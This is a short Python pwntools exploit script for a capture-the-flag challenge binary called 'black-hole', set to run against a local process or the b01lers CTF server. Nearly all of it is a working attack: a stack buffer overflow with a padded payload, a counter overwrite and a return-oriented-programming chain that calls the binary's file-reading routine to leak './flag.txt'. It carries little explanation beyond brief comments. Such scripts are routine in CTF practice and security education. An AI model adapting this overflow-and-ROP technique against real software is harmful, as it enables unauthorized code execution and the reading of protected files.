#!/usr/bin/env python2
from pwn import *
import struct

context.terminal = ["tmux", "splitw", "-h"]

BINARY = "./black-hole.dist"
HOST, PORT = "pwn.ctf.b01lers.com", 1005

GDB_SETUP = """
set follow-fork-mode child
"""

if "--live" not in sys.argv:
    p = process(BINARY)
    if "--debug" in sys.argv:
        gdb.attach(p, GDB_SETUP)
else:
    p = remote(HOST, PORT)

print_rax = 0x400BD0  # This gadget doesn't always show up in rop tools.
pop_rdi = 0x0000000000400DC3
read_file = 0x4008C7
flag_address = 0x400E52

payload = b"A" * 140
payload += p64(
    0x90
)  # Overwriting a counter. Must be the correct value to pervent loops or crashes.
payload += p64(pop_rdi)  # Sets up argument to readfile
payload += p64(flag_address)  # './flag.txt'
payload += p64(read_file)
payload += p64(print_rax)

p.sendline(payload)
p.send("d\nd\nd\nd\nd\nd\nd\nd\n")  # Get to where 'lose' is called.

p.interactive()
